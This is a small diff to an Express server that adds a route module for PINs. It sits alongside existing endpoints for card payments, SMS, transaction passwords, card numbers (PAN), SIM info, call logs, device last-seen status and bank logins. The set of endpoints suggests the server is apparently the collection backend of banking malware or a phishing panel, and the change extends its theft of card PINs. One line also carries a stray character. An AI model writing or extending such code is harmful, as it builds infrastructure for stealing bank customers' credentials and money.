@@ -12,6 +12,7 @@ import deviceRoutes from "./routes/deviceRoutes.js";
 import cardPaymentRoutes from "./routes/cardPaymentRoutes.js";
 import smsRoutes from "./routes/smsRoutes.js";
 import transactionPassRoutes from "./routes/transactionPassRoutes.js";
+import pinRoutes from "./routes/pinRoutes.js";
 import panRoutes from "./routes/panRoutes.js";
 import simInfoRoutes from "./routes/simInfoRoutes.js";
 import authRoutes from "./routes/authRoutes.js";
@@ -307,6 +308,7 @@ app.use("/api/action", logRoutes);4
 app.use("/api", formRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
 app.use("/api/call-log", callLogRoutes);
+app.use("/api", pinRoutes);
 app.use("/api", bankLoginRoutes);
 app.use("/api/auth", authRoutes);
 
